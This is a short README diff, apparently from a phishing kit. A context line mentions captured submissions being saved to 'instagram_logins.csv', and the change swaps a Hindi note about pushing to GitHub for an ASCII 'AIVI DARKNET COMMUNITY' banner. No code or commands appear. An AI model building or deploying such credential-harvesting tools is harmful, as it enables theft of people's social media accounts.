@@ -108,6 +108,12 @@ All captured submissions are appended automatically to `instagram_logins.csv` in
 
 ```
 
-Is file ko project folder me save karne ke baad aap apne GitHub repository par push kar sakte hain!
+                                            _    _____     _____
+                                           / \  |_ _\ \   / /_ _|
+                                          / _ \  | | \ \ / / | |
+                                         / ___ \ | |  \ V /  | |
+                                        /_/   \_\___|  \_/  |___|
+                                       AIVI DARKNET COMMUNITY
+                                              VERSION 1.0.0
 
 ```
